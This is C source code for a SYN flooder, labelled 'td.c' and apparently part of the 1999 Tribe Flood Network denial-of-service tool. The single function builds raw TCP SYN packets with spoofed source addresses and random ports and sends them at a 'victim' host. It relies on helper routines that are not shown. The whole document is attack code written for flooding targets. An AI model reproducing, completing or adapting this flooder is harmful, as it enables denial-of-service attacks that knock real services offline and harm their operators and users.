/* td.c - tribe flood network synflooder
   (c) 1999 by Mixter - PRIVATE */

char synb[8192];

void
syn (u_long victim, u_short port)
{
  struct sockaddr_in sin;
  struct iphdr *ih = (struct iphdr *) synb;
  struct tcphdr *th = (struct tcphdr *) (synb + sizeof (struct iphdr));
  srandom ((time (NULL) + random ()));
  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = sizeof (ih) + sizeof (th);
  ih->id = htons (random ());
  ih->frag_off = 0;
  ih->ttl = 255;
  ih->protocol = 6;
  ih->check = 0;
  ih->saddr = k00lip ();
  ih->daddr = victim;
  th->source = htons (getrandom (0, 9999));
  if (port > 0)
    th->dest = htons (port);
  else
    th->dest = htons (getrandom (0, 9999));
  th->seq = htonl (random ());
  th->doff = sizeof (th) / 4;
  th->ack_seq = htons (rand ());
  th->res1 = 0;
  th->fin = 0;
  th->syn = 1;
  th->rst = 0;
  th->psh = 0;
  th->ack = 0;
  th->urg = 1;
  th->res2 = 0;
  th->window = htons (65535);
  th->check = 0;
  th->urg_ptr = htons (rand ());
  th->check = ip_sum (synb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
  ih->check = ip_sum (synb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
  sin.sin_family = AF_INET;
  sin.sin_port = th->dest;
  sin.sin_addr.s_addr = ih->daddr;
  sendto (rawsock, synb, 4 * ih->ihl + sizeof (struct tcphdr), 0, &sin, sizeof (sin));
  WAITAMOMENT;
}
